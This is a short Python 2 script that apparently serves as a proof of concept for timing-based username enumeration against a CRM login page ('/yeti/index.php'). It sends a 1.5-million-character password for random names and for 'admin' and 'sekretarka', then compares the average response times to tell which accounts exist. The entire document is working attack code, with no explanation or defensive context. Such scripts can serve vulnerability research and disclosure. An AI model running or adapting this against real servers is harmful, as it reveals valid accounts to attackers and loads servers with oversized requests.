import httplib
import os, random
import urllib
import datetime, time
def send_req(username, pwd):
    data = {
    "username": username,
    "password": pwd,}

    headers = {
    "Content-Type": "application/x-www-form-urlencoded",}
    data = urllib.urlencode(data)
    conn = httplib.HTTPConnection('localhost')
    t = datetime.datetime.now()
    conn.request("POST", "/yeti/index.php?module=Users&action=Login", data, headers)
    t = datetime.datetime.now()
    conn.getresponse()
    return datetime.datetime.now() - t
def mean(username, num, pass_len):
    pwd = 'x'*pass_len
    times = [send_req(username, pwd).total_seconds() for _ in xrange(num)]
    return sum(times) / num
def main():
    USERNAMES = ["RAND-"+os.urandom(7).encode('hex') for _ in xrange(5)] + ['admin',
    'sekretarka']
    NUM = 1
    random.shuffle(USERNAMES)
    for username in USERNAMES:
        t = mean(username, NUM, 1500000)
        print ("Average time for user \"{}\" is {}s.".format(username, t))
if __name__ == '__main__':
    main()